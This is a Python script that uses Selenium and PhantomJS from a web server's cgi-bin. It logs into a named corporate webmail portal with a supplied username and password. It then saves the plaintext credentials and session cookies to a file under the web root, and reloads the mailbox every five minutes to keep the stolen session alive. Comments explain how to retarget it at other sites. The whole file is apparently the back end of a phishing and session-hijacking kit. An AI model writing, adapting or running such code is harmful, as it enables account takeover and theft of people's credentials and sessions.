#!/usr/bin/python
import sys
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import httplib, urllib

def main(username,password):
    #conn = conn = httplib.HTTPSConnection("api.pushover.net:443")
    #conn.request("POST", "/1/messages.json",
    #  urllib.urlencode({
    #    "token": "APP_TOKEN",
    #    "user": "USER_KEY",
    #    "message": "hello world",
    #  }), { "Content-type": "application/x-www-form-urlencoded" })
    #conn.getresponse()
    driver = webdriver.PhantomJS("/var/www/html/cgi-bin/phantomjs") #update to phantomjs location
    driver.get("https://myemail.accenture.com") #add the site you are logging into
    usernamefield = driver.find_element_by_id("userNameInput") #update this to select the username element on the page
    usernamefield.send_keys(username)
    passwordfield = driver.find_element_by_id("passwordInput") #update to select password element
    passwordfield.send_keys(password)
    #driver.save_screenshot("keys.png") #this can troubleshoot what is being submitted
    driver.find_element_by_id("submitButton").click() #update to select the submit button. I found when using PhantomJS for some reason "RETURN" does not work, need to click
    #driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    WebDriverWait(time.sleep(60),0) 
    driver.save_screenshot("postreturn.png") #this can troubleshoot after clicking submit what happens
    timestamp = time.time()
    cookiefile = "/var/www/html/cgi-bin/cookies/" + username +"time" + str(timestamp)
    with open(cookiefile,'a') as f:
        cookies = driver.get_cookies()
        f.write("USER: ")
        f.write(str(username) + " PASS: " + str(password) + "\r\n")
        f.write(str(cookies))
    
    while True:
        time.sleep(300)
        driver.get("https://myemail.owasite.com") #this will continuously reload the page every 5 minutes in order to attempt to keep the session alive. Depending on the sites settings may not work but did on my first run
        
if __name__ == "__main__":
    print sys.argv[1:]
    main(sys.argv[1],sys.argv[2])
